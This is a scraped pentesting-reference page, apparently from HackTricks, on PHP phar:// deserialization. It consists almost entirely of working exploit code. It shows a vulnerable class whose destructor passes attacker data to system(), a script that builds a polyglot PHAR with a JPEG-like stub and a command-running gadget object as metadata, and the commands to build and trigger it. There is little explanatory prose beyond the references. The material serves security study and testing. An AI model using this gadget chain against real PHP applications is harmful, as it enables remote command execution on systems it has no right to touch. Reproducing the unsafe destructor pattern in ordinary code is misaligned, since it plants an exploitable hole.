---
title: "phar:// deserialization"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/file-inclusion/phar-deserialization.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

`phar://` Deserialization

```
<?php
class AnyClass {
	public $data = null;
	public function __construct($data) {
		$this->data = $data;
	}
	function __destruct() {
		system($this->data);
	}
}
filesize("phar://test.phar"); // Attacker-controlled path on affected PHP versions
```
```
<?php
class AnyClass {
	public $data = null;
	public function __construct($data) {
		$this->data = $data;
	}
	function __destruct() {
		system($this->data);
	}
}
// Create a new PHAR.
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
// Store the gadget object as metadata.
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```
```
php --define phar.readonly=0 create_phar.php
```
```
php vuln.php
```
## References

- [1] [PHP manual - Phar class and PHP 8 metadata-deserialization change](https://www.php.net/manual/en/class.phar.php)
- [2] [PHP manual - Phar::getMetadata](https://www.php.net/manual/en/phar.getmetadata.php)
- [3] [RIPS Technologies - PHP object injection via `phar://` metadata](https://blog.ripstech.com/2018/new-php-exploitation-technique/)
